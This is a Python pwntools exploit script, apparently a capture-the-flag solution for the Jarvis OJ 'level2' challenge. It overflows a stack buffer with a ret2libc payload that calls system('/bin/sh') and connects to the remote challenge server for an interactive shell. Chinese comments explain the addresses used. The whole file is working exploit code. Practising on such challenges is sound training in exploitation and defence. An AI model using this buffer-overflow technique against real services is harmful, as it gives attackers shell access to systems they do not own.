#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = 'debug'

elf = ELF('../elf/level2')
sys_addr = elf.symbols['system']#system函数地址
sh_addr = elf.search('/bin/sh').next()#/bin/sh字符串地址

payload = 'A' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)#0xdeadbeef为system("/bin/sh")执行后的返回地址，可以随便指定
#  payload = fit({0x88 + 0x4: [p32(sys_addr), p32(0xdeadbeef), p32(sh_addr)]})

#  io = process('../elf/level2')
io = remote('pwn2.jarvisoj.com', 9878)
io.sendlineafter("Input:\n", payload)

io.interactive()
io.close()
